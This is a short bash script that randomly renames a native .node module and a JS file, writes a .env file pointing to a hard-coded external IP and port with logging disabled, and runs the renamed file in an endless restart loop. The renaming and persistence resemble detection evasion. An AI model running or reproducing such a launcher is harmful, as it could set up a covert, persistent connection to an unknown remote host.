#!/bin/bash
CONNECT=${1:-2}
NAME=${2:-001}
HOST=${3:-103.249.200.131}
PORT=${4:-7777}
RAND="$(tr -dc 'a-z0-9' </dev/urandom | head -c 10)"
NODE_FILE=$(find release/target -type f -name "*.node" | head -n 1)
JS_FILE=$(ls ./*.js 2>/dev/null | head -n 1)
NEW_NODE="release/target/${RAND}.node"
NEW_JS="${RAND}.js"
mv "$NODE_FILE" "$NEW_NODE"
mv "$JS_FILE" "$NEW_JS"
export APP_FILE="./$NEW_NODE"
echo "SERVER_HOST=${HOST}
SERVER_PORT=${PORT}
SERVER_DOMAIN=${NAME}
SERVER_SECRET=x
LOGGING=false
SERVER_CONNECTION=${CONNECT}" > .env
clear
while true; do node $NEW_JS; sleep 5; done

